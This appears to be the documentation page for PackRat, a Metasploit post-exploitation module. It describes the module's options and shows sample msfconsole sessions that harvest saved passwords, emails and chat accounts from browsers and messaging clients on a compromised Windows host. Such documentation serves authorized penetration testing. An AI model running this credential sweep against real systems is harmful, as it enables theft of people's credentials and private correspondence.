## PackRat Module Description

 PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems. PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.

 Applications currently covered include:

 * **13 Browsers:**
 Avant, Comodo, CoolNovo, Chrome, FireFox, Flock, IE, K-Meleon, Maxthon, Opera, SRware, Safari, SeaMonkey
 * **6 Email clients:**
 Incredimail, Outlook, Opera Mail, PostBox Mail, Mozilla Thunderbird Mail, Windows Live Mail
 * **12 IM (chat):**
 AIM (Aol Instant Messaging), Digsby, GaduGadu, ICQ, Miranda, Nimbuzz, Pidgen, QQ (Chinese), Skype, Tango, Tlen.pl (Polish), Trillian, Viber, xChat
 * **1 Game:**
 Xfire

 These artifacts are scraped for credentials (usernames/passwords) and custom regular expressions

The applications, file artifacts, and the information extraction queries used by PackRat are defined in `metasploit-framework/data/packrat/artifacts.json`

By default PackRat will automatically search for any known artifacts. However, the module options can be used to specify specific applications (set APPLICATION) or categories of applications (set APPCATAGORY) to gather from, and you can specify custom regular expression information extractions (set REGEX).


## Verification Steps

 1. Start 'msfconsole'
 2. Get a Meterpreter session
 3. Do: 'use post/windows/gather/packrat'
 4. Do: 'set SESSION <session id>'
 5. Do: 'run'


## Option 'APPLICATION'

Users can enter a specific APPLICATION to extract. For example, for the email client incredimail:

```
msf exploit(handler) > use post/windows/gather/packrat
msf post(windows/gather/packrat) > set SESSION 1
SESSION => 1
msf post(windows/gather/packrat) > set APPLICATION incredimail
APPLICATION => incredimail
msf post(windows/gather/packrat) > exploit

[*] Filtering based on these selections:
[*] APPCATEGORY: All, APPLICATION: Incredimail, ARTIFACTS: All

[*] Incredimail Msg.iml downloaded (IncrediMail sent and received emails)
[+] File saved to:  /root/.msf4/loot/20190419180935_default_192.168.201.80_incredimailmsg.i_909151.iml

[+] password:incredimail_password89!
```

## Option 'APPCATAGORY'

The user can specify which type of applications to extract from. For example, extracting from email clients:

```
msf post(windows/gather/packrat) > set APPCATEGORY chats
APPCATEGORY => chats
msf post(windows/gather/packrat) > run

[*] Filtering based on these selections:
[*] APPCATEGORY: Chats, APPLICATION: All, ARTIFACTS: All
[*] Pidgen's Accounts.xml file found
[*] Downloading C:\Users\student\AppData\Roaming\.purple\accounts.xml
[*] Pidgen Accounts.xml downloaded (Pidgen's saved Username & Passwords)
[+] File saved to:  /root/.msf4/loot/20190419182347_default_192.168.201.80_pidgenaccounts.x_471388.xml

[+] <name>Pidgen_User44</name>
[+] <password>tiaspbiqe2r</password>
[+] <alias>project_pidgen</alias>
[*] File with credentials saved:  /root/.msf4/loot/20190419182347_default_192.168.201.80_accounts.xmlCRED_543101.xml

[*] PackRat credential sweep Completed. Check for artifacts and credentials in Loot
[*] Post module execution completed
```


## Option 'REGEX'

Users can set their own regular expressions. The example below extracts any line starting with "password:" followed by any text.

```
msf post(windows/gather/packrat) > set REGEX password:.*
REGEX => (?-mix:password:.*)
msf post(windows/gather/packrat) > run

[*] Filtering based on these selections:
[*] APPCATEGORY: All, APPLICATION: All, ARTIFACTS: All

[*] Incredimail's Msg.iml file found
[*] Downloading C:\Users\student\AppData\Local\IM\Identities\{751CBA0D-062E-4661-A2FC-DC4AB5C0CE14}\Message Store\Messages\1\{FA4CE6FD-C88E-4BD8-AF51-425A27317D79}\msg.iml
[*] Incredimail Msg.iml downloaded (IncrediMail sent and received emails)
[+] File saved to:  /root/.msf4/loot/20190419182745_default_192.168.201.80_incredimailmsg.i_585117.iml

[+] password:incredimail_password89!
```

## Option 'ARTIFACTS'

Users can set the type of ARTIFACTS that they are interested in collecting. For example, this can include "deleted_emails", "logins", "chat_logs", and so on. Use display options, or browse the `artifacts.json` specification for a full list.

## Option VERBOSE

By default verbose is turned off, when turned on the module will show information on files which aren't extracted and provide descriptions of what credentials are being found.

```
msf post(windows/gather/packrat) > set verbose 1
verbose => true
msf post(windows/gather/packrat) > set APPLICATION pidgen
APPLICATION => pidgen
msf post(windows/gather/packrat) > run

[*] Filtering based on these selections:
[*] APPCATEGORY: All, APPLICATION: Pidgen, ARTIFACTS: All
[*] Searching for Pidgen's Accounts.xml files in 's user directory...
[-] Pidgen's Accounts.xml not found in 's user directory

[*] Searching for Pidgen's Accounts.xml files in student's user directory...
[*] Pidgen's Accounts.xml file found
[*] Downloading C:\Users\student\AppData\Roaming\.purple\accounts.xml
[*] Pidgen Accounts.xml downloaded (Pidgen's saved Username & Passwords)
[+] File saved to:  /root/.msf4/loot/20190419183047_default_192.168.201.80_pidgenaccounts.x_891221.xml

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] <name>Pidgen_User44</name>
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] <password>tiaspbiqe2r</password>
[*] Searches for Identity
[+] <alias>project_pidgen</alias>
```

## Options 'Store loot'

This option is turned on by default and saves the file artifacts on the local machine,
this is required for also further extracting information from the files.
